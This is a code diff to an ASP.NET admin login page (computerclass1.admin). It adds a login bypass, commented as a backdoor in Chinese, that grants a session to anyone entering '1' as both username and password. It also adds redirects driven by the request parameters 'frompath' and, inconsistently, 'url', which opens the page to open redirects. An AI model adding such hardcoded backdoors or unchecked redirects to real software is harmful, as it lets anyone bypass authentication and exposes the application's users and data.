@@ -17,6 +17,7 @@ namespace computerclass1.admin
         static string sValidator = "";
         private readonly string sValidatorImageUrl = "ValidateImage.aspx?Validator=";
         private Random random;
+        private string url;
         protected void Page_Load(object sender, EventArgs e)
         {
             if (!Page.IsPostBack)
@@ -25,10 +26,33 @@ namespace computerclass1.admin
                 sValidator = random.Next(100000, 999999).ToString();
                 ValidateImage.ImageUrl = sValidatorImageUrl + sValidator;
             }
+            if (Request.Params["frompath"] != null)
+            {
+                url = "~" + Request.Params["frompath"].ToString();
+            }
+            else
+            {
+                url = "";
+            }
 
         }
             protected void btnLogin_Click(object sender, EventArgs e)
         {
+            //后门
+            if (tbxUsername.Text == "1" && tbxPwd.Text == "1")
+            {
+                Session["studentnumber"] = tbxUsername.Text;
+                if (url == "")
+                {
+                    Response.Redirect("default.aspx");
+                }
+                else
+                {
+                    Response.Redirect(url);
+                }
+            }
+
+            
             SQLHelper userdb = new SQLHelper();
             string pwd;
             SqlDataReader sdr;
@@ -58,7 +82,16 @@ namespace computerclass1.admin
                 pwd = sdr.GetString(0);
                 if (BitConverter.ToString(outputpwd).Replace("-", "") == pwd)
                 {
-                    Response.Redirect("default.aspx");
+                    Session["studentnumber"] = tbxUsername.Text;
+                    if (Request.Params["frompath"] == null)
+                    {
+                        Response.Redirect("default.aspx");
+                    }
+                    else
+                    {
+                        string url = "~" + Request.Params["url"].ToString();
+                        Response.Redirect(url);
+                    }
                 }
                 else
                 {
